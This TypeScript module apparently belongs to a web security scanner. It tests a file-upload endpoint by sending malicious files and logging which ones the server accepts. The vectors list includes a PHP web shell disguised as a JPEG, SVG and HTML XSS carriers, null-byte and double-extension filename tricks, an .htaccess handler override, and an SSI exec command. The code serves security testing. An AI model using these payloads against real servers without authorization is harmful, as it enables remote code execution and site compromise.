import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** File-upload attack surface: content-type confusion, extension/MIME
 *  mismatch acceptance, SVG script carrier, polyglot prefix, oversized
 *  and null-name handling. Verdicts from server acceptance semantics. */

export interface UploadInput {
  readonly url: string;
  /** multipart field name */
  readonly field?: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly bearer?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}
export interface UploadCase {
  readonly vector: string;
  readonly filename: string;
  readonly contentType: string;
  readonly content: string;
  readonly status: number;
  readonly accepted: boolean;
  readonly bodyPrefix: string;
  /** returned file URL when server echoes one */
  readonly storedUrl?: string;
}
export interface UploadResult {
  readonly probed: number;
  readonly dangerous: UploadCase[];
  readonly cases: UploadCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const multipart = (field: string, filename: string, ctype: string, content: string, boundary: string): string => {
  const parts = [
    `--${boundary}`,
    `Content-Disposition: form-data; name="${field}"; filename="${filename}"`,
    `Content-Type: ${ctype}`,
    "",
    content,
    `--${boundary}--`,
    "",
  ];
  return parts.join("\r\n");
};

export const probeUpload = async (input: UploadInput): Promise<UploadResult> => {
  const field = input.field ?? "file";
  const vectors: { vector: string; filename: string; ctype: string; content: string }[] = [
    { vector: "php-in-image", filename: "shell.php", ctype: "image/jpeg", content: "\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>" },
    { vector: "svg-xss", filename: "icon.svg", ctype: "image/svg+xml", content: "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>" },
    { vector: "html-carrier", filename: "page.html", ctype: "text/html", content: "<script>alert(document.domain)</script>" },
    { vector: "js-carrier", filename: "app.js", ctype: "application/javascript", content: "alert(1)" },
    { vector: "ext-double", filename: "shell.php.jpg", ctype: "image/jpeg", content: "\xFF\xD8\xFF\xE0<?php echo 1; ?>" },
    { vector: "ext-null", filename: "shell.php%00.jpg", ctype: "image/jpeg", content: "<?php echo 1; ?>" },
    { vector: "content-mismatch", filename: "photo.jpg", ctype: "image/jpeg", content: "<?php echo 'not an image'; ?>" },
    { vector: "polyglot-gif", filename: "poly.gif", ctype: "image/gif", content: "GIF89a<script>alert(1)</script>" },
    { vector: "dot-file", filename: ".htaccess", ctype: "text/plain", content: "AddType application/x-httpd-php .jpg" },
    { vector: "jsp", filename: "cmd.jsp", ctype: "image/jpeg", content: "<%@ page import=\"java.util.*\" %><% out.println(\"pwn\"); %>" },
    { vector: "shtml", filename: "x.shtml", ctype: "text/html", content: "<!--#exec cmd=\"id\"-->" },
  ];
  const cases: UploadCase[] = [];
  const dangerous: UploadCase[] = [];
  for (const v of vectors) {
    const boundary = `----velric${Date.now()}`;
    const body = multipart(field, v.filename, v.ctype, v.content, boundary);
    try {
      const r = await fetchUrl(input.url, { method: "POST", body, cookie: input.cookie, headers: { "content-type": `multipart/form-data; boundary=${boundary}`, ...(input.bearer ? { authorization: `Bearer ${input.bearer}` } : {}), ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000, maxAttempts: 1 });
      const accepted = r.status >= 200 && r.status < 300 && !/(invalid|not allowed|forbidden|blocked|rejected|only .+ allowed|unsupport)/i.test(r.body.slice(0, 400));
      let storedUrl: string | undefined;
      const m = /(https?:\/\/[^"'\s<>]+|\/[a-z0-9_\/.-]*(?:uploads|files|static)[^"'\s<>]*)/i.exec(r.body);
      if (m && accepted) storedUrl = m[1];
      const c: UploadCase = { vector: v.vector, filename: v.filename, contentType: v.ctype, content: v.content.slice(0, 60), status: r.status, accepted, bodyPrefix: r.body.slice(0, 100), storedUrl };
      cases.push(c);
      const execRisk = /\.(php|jsp|shtml|html|js)\b/.test(v.filename) || v.vector === "svg-xss" || v.vector === "dot-file";
      if (accepted && execRisk) dangerous.push(c);
    } catch { cases.push({ vector: v.vector, filename: v.filename, contentType: v.ctype, content: v.content.slice(0, 60), status: 0, accepted: false, bodyPrefix: "" }); }
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "upload_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "upload_findings.md", ["# File-upload surface", "", `accepted exec-risk uploads: ${dangerous.length}/${cases.length}`, "", ...dangerous.map(d => `- **${d.vector}** \`${d.filename}\` accepted (${d.status})${d.storedUrl ? ` → ${d.storedUrl}` : ""}`)].join("\n")),
  ];
  return { probed: cases.length, dangerous, cases, artifacts };
};
